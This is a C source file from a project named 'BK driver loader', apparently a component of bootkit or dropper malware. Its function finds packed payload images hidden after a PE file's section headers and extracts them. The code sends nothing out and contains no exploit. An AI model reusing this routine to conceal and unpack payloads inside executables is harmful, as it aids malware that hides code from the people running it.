//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.9.2.
//	
// module: joiner.c
// $Revision: 84 $
// $Date: 2012-07-20 17:16:28 +0400 (Пт, 20 июл 2012) $
// description: 
//	BK helper library. Joined data suppport routines.

#include "main.h"
#include "joiner.h"


//
//	Searches for the joined data within the specified module.
//	If found, allocated a memory buffer and copies the data into it. If the data packed - unpacks it.
//	In case of success (the data found and copied) returns TRUE, otherwise returns FALSE.
//
BOOL	GetJoinedData(
	PIMAGE_DOS_HEADER	LoaderBase,	// Base of a module containing joined data
	PCHAR*				pBuffer,	// Pointer to a variable which receives pointer to a buffer containing joined data
	PULONG				pSize,		// Pointer to a variable which receives size of the buffer
	BOOL				Is64Bit,	// TRUE if 64-bit resource requested
	ULONG				NameHash,	// CRC32 hash of the name of the joined data file
	ULONG				TypeFlags	// Type of the joined data
	)
{
	BOOL	Ret = FALSE;
	PIMAGE_NT_HEADERS		Pe;
	PIMAGE_SECTION_HEADER	Section;
	PADDON_DESCRIPTOR		AdDesc;

	Pe = (PIMAGE_NT_HEADERS)((PCHAR)LoaderBase + LoaderBase->e_lfanew);
	Section = IMAGE_FIRST_SECTION(Pe);
	AdDesc = (PADDON_DESCRIPTOR)(Section + Pe->FileHeader.NumberOfSections + 1);

	while (AdDesc->Magic != 0 && AdDesc->Magic != ADDON_MAGIC)
		AdDesc += 1;

	while (AdDesc->Magic == ADDON_MAGIC)
	{
		if ((!TypeFlags || (AdDesc->Flags & TypeFlags)) && (!NameHash || (AdDesc->ImageId == NameHash)))
		{
			if (((AdDesc->Flags & PE_FLAG_X64) && Is64Bit) || (!(AdDesc->Flags & PE_FLAG_X64) && !Is64Bit))
			{
				PCHAR	Unpacked;
				if (Unpacked = AppAlloc(AdDesc->ImageSize + 1))	// Adding one extra byte for NULL-char to simplify text files processing.
				{
					if (((AdDesc->Flags & TARGET_FLAG_PACKED) && (aP_depack((PCHAR)LoaderBase + AdDesc->ImageRva, Unpacked) == AdDesc->ImageSize)) ||
						(!(AdDesc->Flags & TARGET_FLAG_PACKED) && memcpy(Unpacked, (PCHAR)LoaderBase + AdDesc->ImageRva, AdDesc->ImageSize)))
					{
						Unpacked[AdDesc->ImageSize] = 0;	// Adding NULL-char to the end of the buffer
						*pBuffer = Unpacked;
						*pSize = AdDesc->ImageSize;
						Ret = TRUE;
						break;
					}
					else
						AppFree(Unpacked);
				}	// if (Unpacked = AppAlloc(AdDesc->ImageSize))
			}	// if (((AdDesc->Flags & PE_FLAG_NATIVE) && IsDriver) || (!(AdDesc->Flags & PE_FLAG_NATIVE) && !IsDriver))
		}	// if (AdDesc->Flags & TypeFlags)
		AdDesc = (PADDON_DESCRIPTOR)((PCHAR)AdDesc + AdDesc->NumberHashes * sizeof(ULONG));
		AdDesc += 1;
	}	// while (AdDesc->Magic == ADDON_MAGIC)

	return(Ret);
}